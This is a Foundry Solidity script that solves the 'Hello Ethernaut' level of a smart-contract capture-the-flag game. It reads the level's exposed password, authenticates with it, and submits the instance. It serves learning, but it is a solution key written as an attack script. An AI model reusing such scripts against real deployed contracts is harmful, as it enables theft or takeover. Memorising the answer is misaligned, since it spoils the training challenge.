// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

import {Script} from "forge-std/Script.sol";
import {Instance as HelloEthernaut} from "../../src/hello-ethernaut/HelloEthernaut.sol";
import {Ethernaut} from "../../src/Ethernaut.sol";

contract HelloEthernautAttack is Script {
  function run() public{
    address helloEthernautAddress = vm.envAddress("VICTIM_CONTRACT_INSTANCE");
    HelloEthernaut helloEthernaut = HelloEthernaut(helloEthernautAddress);
    
    address ethernautAddress = vm.envAddress("ETHERNAUT_CONTRACT_INSTANCE");
    Ethernaut ethernaut = Ethernaut(ethernautAddress);

    uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
    vm.startBroadcast(deployerPrivateKey);

    // Attack
    string memory pass = helloEthernaut.password();
    helloEthernaut.authenticate(pass);

    // Submit level instance
    ethernaut.submitLevelInstance(payable(address(helloEthernaut)));

    vm.stopBroadcast();
  }
}